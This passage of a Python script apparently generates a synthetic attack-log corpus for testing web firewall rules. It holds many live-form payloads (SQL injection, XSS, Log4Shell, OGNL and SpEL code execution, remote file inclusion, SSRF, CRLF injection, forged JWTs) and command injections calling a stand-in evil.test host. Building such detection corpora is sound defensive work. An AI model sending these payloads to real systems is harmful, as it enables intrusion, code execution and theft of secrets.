        "/api/v2/me?jwt=eyJhbGciOiJIUzI1NiJ9.eyJncm91cCI6ImFkbWluIn0.",
        "/login/sso?token=eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoic3VwZXJhZG1pbiJ9.",
        "/api/account?bearer=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InJvb3QifQ.",
        "/auth/verify?jwt=eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.",
    ]
    for i, p in enumerate(jwt_alg_paths):
        add("jwt_alg_confusion", f"10.0.2.{v4_last(10 + i)}", "GET", p)

    # API BOLA/IDOR — OpenAPI strict prod senaryolari
    api_bola_paths = [
        "/api/v1/users/2/profile?as_user=1",
        "/api/v1/orders/99?account_id=1",
        "/api/v1/invoices/42/download?owner=admin",
        "/api/v1/files/7?user_id=other",
        "/api/v1/tenants/2/settings?tenant_id=1",
        "/api/v1/wallet/55/transfer?from_account=1",
        "/api/v1/messages/12/read?recipient=admin",
        "/api/v1/subscriptions/3/cancel?customer=2",
        "/api/v1/keys/9/rotate?scope=admin",
        "/api/v1/reports/export?user=2&filter=all",
        "/api/v1/billing/invoice/88?org=other",
        "/api/v1/projects/5/members?add_role=admin",
    ]
    for i, p in enumerate(api_bola_paths):
        add("api_bola", f"10.0.3.{v4_last(10 + i)}", "GET", p)

    redirect_paths = [
        "/redirect?url=http://evil.test/phish",
        "/login?next=//evil.test/admin",
        "/oauth?redirect_uri=https://evil.test/callback",
        "/logout?return=http://evil.test",
        "/auth?callback=//evil.test",
        "/link?target=javascript:alert(1)",
        "/go?u=http://169.254.169.254/",
        "/out?url=//evil.test",
        "/continue?next=%2F%2Fevil.test",
        "/sso?returnUrl=http://evil.test",
        "/api/redirect?to=//evil.test/path",
        "/jump?dest=https://evil.test",
        "/forward?url=http://127.0.0.1:22",
        "/navigate?path=//evil.test",
        "/proxy?next=http://evil.test",
        "/login?redirect=//evil.test%2fadmin",
        "/auth/callback?return_to=http://evil.test",
        "/signin?continue=//evil.test",
        "/account?nextUrl=http://evil.test",
        "/api/v1/redirect?url=//evil.test",
    ]
    for i, p in enumerate(redirect_paths):
        add("open_redirect", f"198.51.102.{v4_last(10 + i)}", "GET", p)

    jndi_paths = [
        "/api?q=${jndi:ldap://evil.test/a}",
        "/search?x=${jndi:dns://evil.test}",
        "/log?msg=${jndi:ldap://169.254.169.254/a}",
        "/api/lookup?host=${jndi:rmi://evil.test/obj}",
        "/user?name=${jndi:ldap://127.0.0.1:1389/x}",
        "/event?data=${jndi:ldap://evil.test/log4shell}",
        "/api/v1/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.test%2Fa%7D",
        "/form?input=${jndi:ldap://evil.test/}",
        "/contact?msg=${jndi:dns://evil.test}",
        "/api/log?line=${jndi:ldap://evil.test/x}",
        "/report?title=${jndi:ldap://evil.test/t}",
        "/search?term=${jndi:ldap://evil.test/s}",
        "/api/user?name=${jndi:ldap://evil.test/u}",
        "/feedback?text=${jndi:ldap://evil.test/f}",
        "/api/echo?x=${jndi:ldap://evil.test/e}",
    ]
    for i, p in enumerate(jndi_paths):
        add("log4shell", f"203.0.115.{v4_last(10 + i)}", "GET", p)

    # Java/Template RCE — Spring4Shell (CVE-2022-22965), Struts2 OGNL,
    # Text4Shell (CVE-2022-42889). Ham form: waf_rules.c java_rce_patterns.
    java_rce_paths = [
        "/spring?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x",
        "/app?bean.class.module.classLoader.URLs%5B0%5D=x",
        "/x?d.class.classLoader.resources.dirContext.docBase=/tmp",
        "/struts?redirect=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS",
        "/action?x=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)",
        "/s2?y=(%23context=new+java.lang.ProcessBuilder)",
        "/text?q=${script:javascript:java.lang.Runtime}",
        "/text2?q=${url:UTF-8:http://evil.test/x}",
        "/text3?q=${dns:address|evil.test}",
        "/tpl?x=${env:AWS_SECRET_ACCESS_KEY}",
        "/spring2?class.module.classLoader.resources=1",
        "/ognl?z=%23_memberAccess%5B%22allowStaticMethodAccess%22%5D=true",
        "/commons?q=${script:js:java.lang.Runtime.getRuntime()}",
        "/struts3?p=@ognl.OgnlRuntime@getRuntime",
        "/spring3?class.module.classLoader.DefaultAssertionStatus=1",
    ]
    for i, p in enumerate(java_rce_paths):
        add("java_rce", f"203.0.120.{v4_last(10 + i)}", "GET", p)

    # Modern uygulama RCE — PHP-CGI CVE-2024-4577 (arg injection) + Spring SpEL.
    # Ham form: waf_rules.c modern_rce_patterns.
    modern_rce_paths = [
        "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input",
        "/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input",
        "/cgi-bin/php?%ADd+cgi.force_redirect%3D0+%ADd+auto_prepend_file%3D/tmp/x",
        "/api?exp=T(java.lang.Runtime).getRuntime().exec('id')",
        "/spel?x=T(java.lang.ProcessBuilder)",
        "/eval?q=%23this.getClass().forName('java.lang.Runtime')",
        "/route?spring.cloud.function.routing-expression=T(java.lang.Runtime)",
        "/php?-d+allow_url_include%3d1",
    ]
    for i, p in enumerate(modern_rce_paths):
        add("modern_rce", f"203.0.121.{v4_last(10 + i)}", "GET", p)

    # Enterprise OGNL — Confluence CVE-2022-26134, Struts WebWork stack.
    # Ham form: waf_rules.c enterprise_ognl_patterns.
    enterprise_ognl_paths = [
        "/confluence?x=ognl.OgnlUtil%23getValue",
        "/wiki/pages/createpage.action?queryString=ognl.OgnlUtil",
        "/x?cmd=com.opensymphony.xwork2.ActionContext.getContainer",
        "/struts2?foo=webwork.util.ValueStack%23findValue",
        "/atlassian?p=confluence.webwork.ServletAction",
        "/api?expr=DefaultMemberAccess%26_memberAccess",
    ]
    for i, p in enumerate(enterprise_ognl_paths):
        add("enterprise_ognl", f"203.0.122.{v4_last(10 + i)}", "GET", p)

    # OAuth 2.0 / OIDC abuse — redirect_uri hijack, PKCE downgrade, implicit flow
    # Ham form: waf_rules.c oauth_abuse_patterns
    oauth_abuse_paths = [
        "/oauth/authorize?redirect_uri=https://evil.test/callback",
        "/oauth/authorize?redirect_uri=//evil.test/oauth/cb",
        "/oauth/authorize?response_type=token&redirect_uri=https://evil.test",
        "/oauth/token?grant_type=password&username=admin&password=x",
        "/oauth/token?grant_type=client_credentials&client_id=leaked",
        "/oauth/authorize?code_challenge_method=plain&code_challenge=x",
        "/openid/connect/authorize?redirect_uri=http://evil.test/sso",
        "/oauth/authorize?client_id=app&redirect_uri=https://evil.test/x",
        "/oauth/token?grant_type=client&client_secret=leak",
        "/oauth/callback?redirect_uri=//evil.test/path",
        "/sso/oauth?response_type=token&redirect_uri=https://evil.test",
        "/api/oauth/authorize?redirect_uri=http://evil.test/cb",
    ]
    for i, p in enumerate(oauth_abuse_paths):
        add("oauth_abuse", f"203.0.124.{v4_last(10 + i)}", "GET", p)

    # RFI — waf_rules.c rfi_patterns (php://, data://, remote include)
    rfi_paths = [
        "/include?page=http://evil.test/shell.txt",
        "/load?file=https://evil.test/backdoor.php",
        "/import?src=ftp://evil.test/payload.txt",
        "/view?path=php://filter/convert.base64-encode/resource=index.php",
        "/read?f=php://input",
        "/fetch?u=data://text/plain,<?php+system('id');?>",
        "/proxy?url=expect://id",
        "/archive?z=zip://evil.zip%23shell.php",
        "/glob?p=glob:///etc/passwd",
        "/remote?inc=http://185.220.1.1/x.php",
        "/template?file=ftps://evil.test/x",
        "/render?src=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
    ]
    for i, p in enumerate(rfi_paths):
        add("rfi", f"203.0.123.{v4_last(10 + i)}", "GET", p)

    # GraphQL abuse — waf_rules.c graphql_patterns + derin nesting
    graphql_paths = [
        "/graphql?query={__schema{types{name}}}",
        "/api/graphql?query=query+IntrospectionQuery{__schema{queryType{name}}}",
        "/gql?query=mutation+{deleteUser(id:1)}",
        "/v1/graphql?query={__typename}",
        "/graphql?query=query+{__type(name:%22User%22){fields{name}}}",
        "/api/graphql?query=query{__schema{mutationType{name}}}",
        "/gql?query=query{__schema{subscriptionType{name}}}",
        "/graphql?query=query{__type(name:\"User\"){fields{name}}}",
    ]
    for i, p in enumerate(graphql_paths):
        add("graphql_abuse", f"203.0.124.{v4_last(10 + i)}", "GET", p)

    # OS command injection — waf_rules.c shellcmd_patterns
    shellcmd_paths = [
        "/run?cmd=;id;",
        "/exec?x=|whoami",
        "/ping?host=8.8.8.8;cat+/etc/passwd",
        "/api?p=$(id)",
        "/shell?c=`id`",
        "/diag?test=;ls+-la",
        "/tool?arg=|cat+/etc/shadow",
        "/run?cmd=&&+ping+-c+1+evil.test",
        "/win?cmd=cmd.exe+/c+whoami",
        "/ps?x=powershell+-enc+evil",
        "/fetch?u=;wget+http://evil.test/x",
        "/proxy?url=|curl+http://169.254.169.254/",
    ]
    for i, p in enumerate(shellcmd_paths):
        add("shellcmd", f"203.0.125.{v4_last(10 + i)}", "GET", p)

    crlf_paths = [
        "/api/redirect?url=%0d%0aSet-Cookie:evil=1",
        "/proxy?target=foo%0d%0aX-Injected:1",
        "/login?next=/%0d%0aLocation:http://evil.test",
        "/auth?callback=ok%0d%0aX-Evil:1",
        "/go?u=test%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1+200",
        "/api/header?val=foo%0d%0aX-Forwarded-For:127.0.0.1",
        "/redirect?to=%0d%0aSet-Cookie:session=hijack",
        "/out?url=path%0d%0aX-Custom:evil",
        "/link?dest=a%0d%0aLocation:javascript:alert(1)",
        "/forward?next=%0d%0aX-Admin:true",
        "/api/v1/redirect?url=%0d%0aSet-Cookie:admin=1",
        "/nav?to=%0d%0aX-Injected:yes",
        "/jump?url=x%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>",
        "/sso?return=%0d%0aLocation://evil.test",
        "/callback?u=%0d%0aX-Forwarded-Host:evil.test",
    ]
    for i, p in enumerate(crlf_paths):
        add("crlf", f"198.51.103.{v4_last(10 + i)}", "GET", p)

    # Host header / cache poisoning probe (Sprint 7+ corpus +1)
    host_hdr_paths = [
        "/api/login",
        "/admin",
        "/panel",
        "/api/v1/users",
        "/cdn/asset",
        "/api/health",
        "/internal/status",
        "/api/config",
        "/metrics",
        "/api/debug",
        "/api/v2/session",
        "/static/app.js",
        "/api/oauth/callback",
        "/api/graphql",
        "/api/upload",
    ]
    for i, p in enumerate(host_hdr_paths):
        add("host_header_injection", f"203.0.126.{v4_last(10 + i)}", "GET", p, 400 if i % 3 else 403)

    upload_paths = [
        "/upload?file=shell.php",
        "/api/upload?name=cmd.jsp",
        "/files?f=backdoor.aspx",
        "/media?path=webshell.phtml",
        "/attach?doc=evil.php5",
        "/import?file=shell.php7",
        "/api/v1/upload?filename=hack.php",
        "/cdn?asset=shell.phar",
        "/storage?key=evil.jsp",
        "/backup?restore=shell.cgi",
        "/api/files?upload=cmd.sh",
        "/assets?file=shell.asp",
        "/doc?upload=evil.aspx",
        "/api/media?f=shell.php",
        "/content?file=backdoor.php",
        "/api/import?path=shell.jsp",
        "/files/upload?n=evil.php",
        "/api/v2/upload?file=cmd.php",
        "/media/upload?f=shell.phtml",
        "/attach?file=webshell.php",
    ]
    for i, p in enumerate(upload_paths):
        add("webshell", f"192.0.3.{v4_last(10 + i)}", "GET", p, 403, UA_SCAN)

    # Encoding evasion — SQLi / XSS (WAF bypass varyantlari)
    sqli_evasion = [
        "/search?q=1%2527%20OR%201%3D1--",
        "/api?id=1%27%20%4f%52%201%3d%31--",
        "/filter?x=1'%09OR%091=1--",
        "/q?p=1'%0aOR%0a1=1--",
        "/api/v1?id=1'%0dOR%0d1=1--",
        "/find?k=1'/**/OR/**/1=1--",
        "/data?x=1'%20%55%4e%49%4f%4e%20SELECT%201--",
        "/api?q=1'+/*!50000OR*/1=1--",
        "/search?s=1'%20OR%201%3D1%23",
        "/item?id=1%27%20%6f%72%201%3d1--",
        "/api/users?id=1'%20UNION%20ALL%20SELECT%201,2--",
        "/report?sort=1';SELECT+pg_sleep(1)--",
        "/catalog?c=1'%20AND%20SUBSTRING(@@version,1,1)='5'--",
        "/crm?lead=1'%20OR%20CHAR(49)=CHAR(49)--",
        "/billing?inv=1'%20OR%201=1%20LIMIT%201--",
        "/helpdesk?t=1'%20UNION%20SELECT%20null,version()--",
        "/forum?topic=1'%20OR%20'x'='x",
        "/wiki?page=1'%20OR%201%3C%3E0--",
        "/stats?dim=1'%20UNION%20SELECT%20table_name,null--",
        "/api/search?filter=1'%20AND%201=1%20--%20",
    ]
    for i, p in enumerate(sqli_evasion):
        add("sqli", f"198.51.100.{v4_last(300 + i)}", "GET", p)
    for i in range(30):
        add(
            "sqli",
            f"198.51.100.{v4_last(320 + i)}",
            "GET",
            f"/api/v3/search?q=1%27+OR+1%3D1--+{i}",
        )

    xss_polyglot = [
        "/api/echo?x=jaVasCript:/*-/*%60/*%5C%60/*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)//",
        "/widget?n=%3Csvg%20onload=alert(1)%3E",
        "/v2/render?h=%3Cimg%20src=x%20onerror=alert(1)%3E",
        "/share?t=%3Cscript%3Ealert(document.domain)%3C/script%3E",
        "/embed?s=%3Ciframe%20src=javascript:alert(1)%3E",
        "/preview?d=%3Cbody%20onload=alert(1)%3E",
        "/api/html?c=%3Cdetails%20open%20ontoggle=alert(1)%3E",
        "/render?x=%3Cmath%3E%3Cmi/xlink:href=javascript:alert(1)%3E",
        "/api/echo?m=%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
        "/form?i=%3Cinput%20onfocus=alert(1)%20autofocus%3E",
        "/api/v1/echo?x=%3Csvg/onload=confirm(1)%3E",
        "/widget?h=%3Cimg%20src=1%20onerror=alert(1)%3E",
        "/share?l=%3Ca%20href=javascript:alert(1)%3Eclick%3C/a%3E",
        "/embed?u=%3Cobject%20data=javascript:alert(1)%3E",
        "/preview?h=%3Cmarquee%20onstart=alert(1)%3E",
        "/api/render?x=%3Cvideo%3E%3Csource%20onerror=alert(1)%3E",
        "/v3/echo?p=%3Cisindex%20action=javascript:alert(1)%3E",
        "/api/html?x=%3Ckeygen%20onfocus=alert(1)%20autofocus%3E",
        "/widget?x=%3Cselect%20onfocus=alert(1)%20autofocus%3E",
        "/share?x=%3Ctextarea%20onfocus=alert(1)%20autofocus%3E",
    ]
    for i, p in enumerate(xss_polyglot):
        add("xss", f"203.0.113.{v4_last(90 + i)}", "GET", p)
    for i in range(25):
        add(
            "xss",
            f"203.0.113.{v4_last(110 + i)}",
            "GET",
            f"/api/echo?v={i}&x=%3Cscript%3Ealert({i})%3C/script%3E",
        )

    scanner_2025 = [
        ("/.env.local", UA_SCAN),
        ("/.env.staging", UA_NIKTO),
        ("/api/.env", UA_SCAN),
        ("/config/.env", UA_NIKTO),
        ("/.aws/config", UA_SCAN),
        ("/kubeconfig", UA_SCAN),
        ("/.kube/config", UA_NIKTO),
        ("/terraform.tfstate", UA_SCAN),
        ("/.terraform/", UA_NIKTO),
        ("/id_rsa", UA_SCAN),
        ("/.ssh/id_rsa", UA_NIKTO),
        ("/database.sql", UA_SCAN),
        ("/dump.sql", UA_NIKTO),
        ("/api/debug", UA_SCAN),
        ("/api/internal", UA_NIKTO),
        ("/metrics", UA_SCAN),
        ("/debug/vars", UA_NIKTO),
        ("/.well-known/openid-configuration", UA_SCAN),
        ("/.git/config", UA_NIKTO),
        ("/composer.json", UA_SCAN),
        ("/package.json", UA_NIKTO),
        ("/yarn.lock", UA_SCAN),
        ("/Gemfile", UA_NIKTO),
        ("/requirements.txt", UA_SCAN),
        ("/Dockerfile", UA_NIKTO),
        ("/docker-compose.yml", UA_SCAN),
        ("/.htaccess", UA_NIKTO),
        ("/web.config", UA_SCAN),
        ("/crossdomain.xml", UA_NIKTO),
        ("/clientaccesspolicy.xml", UA_SCAN),
        ("/elmah.axd", UA_NIKTO),
        ("/trace.axd", UA_SCAN),
        ("/server-status?auto", UA_NIKTO),
        ("/nginx_status", UA_SCAN),
        ("/status", UA_NIKTO),
        ("/healthz", UA_SCAN),
        ("/readyz", UA_NIKTO),
        ("/livez", UA_SCAN),
        ("/api/v1/namespaces/kube-system/pods", UA_SCAN),
        ("/v2/_catalog", UA_NIKTO),
        ("/_all_dbs", UA_SCAN),
        ("/solr/admin/cores", UA_NIKTO),
        ("/hazelcast/rest/cluster", UA_SCAN),
        ("/jolokia/", UA_NIKTO),
        ("/invoker/JMXInvokerServlet", UA_SCAN),
        ("/manager/text/list", UA_NIKTO),
        ("/host-manager/html", UA_SCAN),
        ("/axis2-admin/", UA_NIKTO),
        ("/struts2-showcase/", UA_SCAN),
        ("/wp-json/wp/v2/users", UA_NIKTO),
        ("/xmlrpc.php?rsd", UA_SCAN),
    ]
    for i, (p, ua) in enumerate(scanner_2025):
        add("scanner", f"203.0.113.{v4_last(160 + i)}", "GET", p, 404, ua)

    post_1k = [
        ("POST", "/api/v3/login", "username=admin%27+OR+1%3D1--&password=z"),
        ("POST", "/api/v4/auth", "user=root%27--&pass=1"),
        ("POST", "/api/oauth", "grant_type=password&username=admin%27+OR+1%3D1--"),
        ("POST", "/api/v1/users/search", "filter=1%27+UNION+SELECT+1--"),
        ("POST", "/api/v2/comments", "body=test%27+OR+1%3D1--"),
        ("POST", "/api/v1/orders", "customer=1%27+AND+SLEEP(1)--"),
        ("POST", "/api/graphql/v2", "query=%7B__schema%7Btypes%7Bname%7D%7D%7D"),
        ("POST", "/api/v1/upload/meta", "filename=..%2f..%2fetc%2fpasswd"),
        ("POST", "/api/v1/webhook", "url=http://169.254.169.254/"),
        ("POST", "/api/v2/export", "path=../../../etc/passwd"),
        ("POST", "/api/v1/import", "data=%3C!ENTITY+x+SYSTEM+%22file:///etc/passwd%22%3E"),
        ("POST", "/api/v1/render", "template={{7*7}}"),
        ("POST", "/api/v1/search", "q=${jndi:ldap://evil.test/a}"),
        ("POST", "/api/v1/redirect", "url=//evil.test"),
        ("POST", "/api/v1/token", "jwt=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."),
        ("POST", "/api/v1/query", "filter[$gt]=&limit=10"),
        ("POST", "/api/v1/exec", "cmd=;id"),
        ("POST", "/api/v1/ping", "host=127.0.0.1;whoami"),
        ("POST", "/api/v1/shell", "c=system('id')"),
        ("POST", "/api/v1/run", "script=|curl+evil.test"),
        ("POST", "/api/v1/file", "path=php://filter/convert.base64-encode/resource=index.php"),
        ("POST", "/api/v1/load", "url=http://127.0.0.1:22"),
        ("POST", "/api/v1/fetch", "uri=file:///etc/passwd"),
        ("POST", "/api/v1/proxy", "target=http://metadata.google.internal/"),
        ("POST", "/api/v1/sso", "token=admin%27+OR+1%3D1--"),
        ("POST", "/api/v1/register", "email=test%27+UNION+SELECT+1--"),
        ("POST", "/api/v1/reset", "user=admin%27--"),
        ("POST", "/api/v1/profile", "bio=%3Cscript%3Ealert(1)%3C/script%3E"),
        ("POST", "/api/v1/message", "text=%3Cimg+src=x+onerror=alert(1)%3E"),
        ("POST", "/api/v1/feedback", "msg=1%27+OR+1%3D1--"),
        ("POST", "/api/v1/support", "ticket=1%27+UNION+SELECT+null--"),
        ("POST", "/api/v1/billing", "card=1%27+AND+SLEEP(1)--"),
        ("POST", "/api/v1/checkout", "sku=1%27+OR+1%3D1--"),
        ("POST", "/api/v1/cart", "item=1%27+OR+1%3D1--"),
        ("POST", "/api/v1/wishlist", "id=1%27+OR+1%3D1--"),
        ("POST", "/api/v1/review", "rating=1%27+OR+1%3D1--"),
        ("POST", "/api/v1/rating", "score=1%27+OR+1%3D1--"),
        ("POST", "/api/v1/vote", "poll=1%27+OR+1%3D1--"),
        ("POST", "/api/v1/survey", "answer=1%27+OR+1%3D1--"),
        ("POST", "/api/v1/poll", "choice=1%27+OR+1%3D1--"),
    ]
    for i, (method, path, body) in enumerate(post_1k):
        entries.append(
            {
                "category": "post_sqli",
                "line": line_lg(f"203.0.113.{v4_last(250 + i)}", method, path, 403, body=body),
            }
        )

    api_1k = [
        "/api/v1/admin/users",
        "/api/v1/internal/config",
        "/api/v1/debug/heap",
        "/api/v1/system/env",
        "/api/v1/actuator/env",
        "/api/v1/actuator/heapdump",
        "/api/v1/actuator/mappings",
        "/api/v1/swagger.json",
        "/api/v1/openapi.json",
        "/api/v1/schema",
        "/api/v1/introspect",
        "/api/v1/batch",
        "/api/v1/bulk",
        "/api/v1/mass-assign",
        "/api/v1/override",
        "/api/v1/elevate",
        "/api/v1/impersonate",
        "/api/v1/sudo",
        "/api/v1/root",
        "/api/v1/superuser",
        "/api/v1/privilege",
        "/api/v1/role/admin",
        "/api/v1/permission/all",
        "/api/v1/acl/bypass",
        "/api/v1/idor/1?user=2",
        "/api/v1/orders/1?user_id=2",
        "/api/v1/invoices/99?account=other",
        "/api/v1/files/1?owner=admin",
        "/api/v1/docs/1?share=all",
        "/api/v1/keys/rotate?force=1",
    ]
    for i, p in enumerate(api_1k):
        add("api_abuse", f"10.0.0.{v4_last(90 + i)}", "GET", p)

    # Hedef satir sayisina kadar cesitli varyant (distributed=80 sabit kalir)
    fill_specs = [
        ("sqli", "GET", "/api/item?id=1%27+OR+1%3D1--+{}", UA_NORMAL),
        ("xss", "GET", "/echo?x=%3Cscript%3Ealert({})%3C/script%3E", UA_NORMAL),
        ("lfi", "GET", "/file?path=..%2f..%2fetc%2fpasswd%2f{}", UA_NORMAL),
        ("rce", "GET", "/run?cmd=;id+{}", UA_NORMAL),
        ("ssrf", "GET", "/fetch?url=http://169.254.169.254/{}", UA_NORMAL),
        ("scanner", "GET", "/probe/{}", 404, UA_SCAN),
        ("graphql_abuse", "GET", "/graphql?query={{__schema{{types{{name}}}}}}&n={}", UA_NORMAL),
        ("rfi", "GET", "/load?file=php://filter/resource=index.php&n={}", UA_NORMAL),
        ("shellcmd", "GET", "/run?cmd=;id+{};", UA_NORMAL),
        ("tr_scan", "GET", "/admin{}/login.php", 403, UA_SCAN),
        ("brute", "POST", "/api/auth?user=admin%27+OR+1%3D1--&n={}", 401, UA_NORMAL),
        ("ssti", "GET", "/render?v=%7B%7B{}%2A7%7D%7D", UA_NORMAL),
        ("nosql", "GET", "/api/users?filter[$gt]={}", UA_NORMAL),
        ("prototype_pollution", "GET", "/api/obj?__proto__[n]={}", UA_NORMAL),
        ("jwt_abuse", "GET", "/api/me?token=eyJhbGciOiJub25lIn0.evil{}", UA_NORMAL),
        ("jwt_alg_confusion", "GET", "/auth?jwt=eyJhbGciOiJub25lIn0.eyJhZG1pbiI6e30.{}", UA_NORMAL),
        ("path_traversal_variant", "GET", "/file?p=%2e%2e%2fetc%2fpasswd%2f{}", UA_NORMAL),
        ("api_bola", "GET", "/api/v1/records/{}?owner=other", UA_NORMAL),
        ("log4shell", "GET", "/api?q=${{jndi:ldap://evil.test/{}}}", UA_NORMAL),
        ("open_redirect", "GET", "/redirect?url=//evil.test/{}", UA_NORMAL),
        ("oauth_abuse", "GET", "/oauth/authorize?redirect_uri=https://evil.test/{}", UA_NORMAL),
        ("crlf", "GET", "/go?u=ok%0d%0aX-Evil:{}", UA_NORMAL),
        ("webshell", "GET", "/upload/shell{}.php", 403, UA_SCAN),
        ("xxe", "GET", "/parse?xml=%3C!ENTITY+x+SYSTEM+%22file:///etc/passwd%22%3E&n={}", UA_NORMAL),
        ("ssti", "GET", "/tpl?x=%24%7B{}%2A7%7D", UA_NORMAL),
    ]
    post_fill_bodies = [
        "username=admin%27+OR+1%3D1--&n={}",
        "filter[$gt]=&id={}",
        "q=${{jndi:ldap://evil.test/{}}}",
        "body=%3Cscript%3Ealert({})%3C/script%3E",
        "cmd=;id+{}",
    ]
    n = 0
    while len(entries) < CORPUS_TARGET:
        if n % 25 == 0 and len(entries) < CORPUS_TARGET:
            body_tpl = post_fill_bodies[(n // 25) % len(post_fill_bodies)]
            entries.append(
                {
                    "category": "post_sqli",
                    "line": line_lg(
                        f"203.0.117.{v4_last((n % 200) + 1)}",
                        "POST",
                        f"/api/v1/fill/{n}",
                        403 if n % 2 else 401,
                        body=body_tpl.format(n),
                    ),
                }
            )
            n += 1
            continue
        cat, method, path_tpl, *rest = fill_specs[n % len(fill_specs)]
        if len(rest) == 2 and isinstance(rest[1], str) and rest[1].startswith("sqlmap"):
            status, ua = rest
        elif len(rest) == 2:
            status, ua = int(rest[0]), rest[1]
        elif len(rest) == 1:
            status, ua = 200, rest[0]
        else:
            status, ua = 200, UA_NORMAL
        path = path_tpl.format(n)
        ip_a, ip_b = (n // 256) % 256, n % 256
        add(cat, f"45.34.{ip_a}.{ip_b}", method, path, status, ua)
        n += 1

    if len(entries) > CORPUS_TARGET:
        entries = entries[:CORPUS_TARGET]

    OUT.parent.mkdir(parents=True, exist_ok=True)
    lines = [e["line"] for e in entries]
    OUT.write_text("\n".join(lines) + "\n", encoding="utf-8")

    categories: dict[str, list[int]] = {}
    for idx, e in enumerate(entries):
        categories.setdefault(e["category"], []).append(idx)

    manifest = {
        "generated": TS,
        "corpus": str(OUT.relative_to(ROOT)),
        "lines_total": len(entries),
        "categories": {
            cat: {"count": len(idxs), "line_indices": idxs}
            for cat, idxs in sorted(categories.items())
        },
    }
    MANIFEST.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
    print(f"[generate_attack_corpus] {OUT} ({len(entries)} lines, {len(categories)} categories)")
    print(f"[generate_attack_corpus] {MANIFEST}")


if __name__ == "__main__":
    main()
